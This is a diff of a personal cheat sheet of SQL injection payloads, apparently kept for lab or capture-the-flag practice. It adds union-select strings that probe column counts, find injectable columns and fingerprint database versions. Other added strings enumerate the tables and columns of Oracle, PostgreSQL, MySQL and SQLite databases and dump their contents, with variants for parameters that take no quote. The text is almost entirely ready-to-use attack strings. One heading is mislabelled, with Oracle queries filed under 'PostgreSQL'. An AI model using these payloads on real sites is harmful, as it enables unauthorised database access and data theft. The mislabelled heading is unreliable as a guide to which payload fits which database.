@@ -14,6 +14,10 @@
 
 ' union select null, null-- - >> Non Oracle
 
+union select null, null >> Without quote in vulnerable parameter
+
+and 1=2 union select null, null >> Without quote in vulnerable parameter
+
 
 
 #To find a column containing strings
@@ -24,7 +28,11 @@
 
 #To identify vulnerable columns
 
-1 and 1=2 union select 1,2,3,4 >> http://10.10.73.120/post?id=1 and 1=2 union select 1,2,3,4
+' union select 1,2,3,4-- -
+
+union select 1,2,3,4 >> Without quote in vulnerable parameter
+
+and 1=2 union select 1,2,3,4 >> Without quote in vulnerable parameter
 
 
 
@@ -36,11 +44,11 @@
 
 ' union select null, version()-- - >> PostgreSQL
 
+' union select null, sqlite_version()-- - >> SQLite
+
 
 
 #SQLite Database info retrieving
-
-sqlite_version()
 
 (SELECT group_concat(tbl_name) FROM sqlite_master)
 
@@ -54,25 +62,39 @@ sqlite_version()
 
 
 
-#To fetch table name
+#PostgreSQL Database info retrieving
 
-' union SELECT table_name,null FROM information_schema.tables-- - >> PostgreSQL
+' union SELECT table_name,null FROM all_tables-- -
 
-' union SELECT table_name,null FROM all_tables-- - >> Oracle
+' union SELECT column_name,null FROM all_tab_columns WHERE table_name = 'table name'-- - 
 
-
-
-#To fetch column name
-
-' union SELECT column_name,null FROM information_schema.columns WHERE table_name='table name'-- - >> PostgreSQL
-
-' union SELECT column_name,null FROM all_tab_columns WHERE table_name = 'table name'-- - >> Oracle
+' union select [column name here],null from [table name here]-- - 
 
 
 
-#To fetch information from columns
+#PostgreSQL Database info retrieving
 
-' union select [column name here],null from [table name here]-- - >> PostgreSQL, Oracle
+' union SELECT table_name,null FROM information_schema.tables-- -
+
+' union SELECT column_name,null FROM information_schema.columns WHERE table_name='[table name]'-- -
+
+' union select [column name here],null from [table name here]-- -
+
+
+
+#Mysql Database info retrieving
+
+' union SELECT table_name,null,null FROM information_schema.tables where table_schema='[Database name here]'
+
+' union SELECT null,null,column_name,null FROM information_schema.columns where table_name='[table name]' limit 0,1
+
+' union select null,null,[column name here],null from [table name here]
+
+and 1=2 union SELECT table_name,null,null FROM information_schema.tables where table_schema='[Database name here]' >> Without qoute in vulnerable parameter
+
+and 1=2 union SELECT null,null,column_name,null FROM information_schema.columns where table_name='[table name]' limit 0,1
+
+and 1=2 union select null,null,[column name here],null from [table name here]
 
 
 
